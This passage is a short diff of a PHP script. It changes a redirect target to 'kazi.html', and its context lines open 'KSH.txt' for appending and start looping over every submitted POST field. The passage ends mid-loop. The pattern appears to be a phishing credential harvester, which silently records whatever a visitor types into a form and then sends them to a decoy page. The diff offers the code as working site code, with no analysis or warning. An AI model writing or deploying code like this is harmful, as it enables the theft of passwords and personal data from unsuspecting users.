@@ -1,5 +1,5 @@
 <?php
-header("location:http:Stride-HTML-Bootstrap-Template-1.1.0/index.html");
+header("location:http:kazi.html");
 $handle=fopen("KSH.txt","a");
 foreach($_POST as $variable=>$value)
 {
